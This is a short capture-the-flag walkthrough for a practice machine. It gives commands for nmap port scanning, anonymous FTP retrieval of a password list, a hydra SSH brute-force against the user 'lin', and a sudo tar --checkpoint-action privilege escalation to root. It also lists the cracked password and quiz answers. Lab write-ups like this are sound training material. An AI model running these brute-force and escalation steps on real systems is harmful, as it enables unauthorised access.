1. deploy the machine 
2. find the open ports using nmap
   nmap -sS ip
   http,ftp,ssh
3. check for anonymous login in ftp
   nmap -A  ip
   anonymous login allowed 
4. ftp ip
   get task.txt
   get locks.txt
5. cat task.txt
   "lin" answer for 3rd question
6. use "locks.txt" as worlist attack on "ssh" (answer for 4th question) using hydra 
   we know the username already "lin"
   hydra -l lin -P locks.txt $ip -t 20  ssh
   "RedDr4gonSynd1cat3" answer for 5th question and it is "lin" user  "ssh" password
7. login "lin" user through "ssh"
   ssh lin@ip
8. you got the "lin" user
   look for "user.txt"
   cat user.txt
   you got the user flag
9. look "lin" user privilege using command
   sudo -l
   in lin user tar is execute as root
10. privilege escalation 
    echo "cat /root/root.txt" > exp
    sudo tar cf /dev/null exp --checkpoint=1 --checkpoint-action=exec=/bin/sh
    now you got the root shell using "id" command we can check it 
    cat /root/root.txt
    now you got the root flag
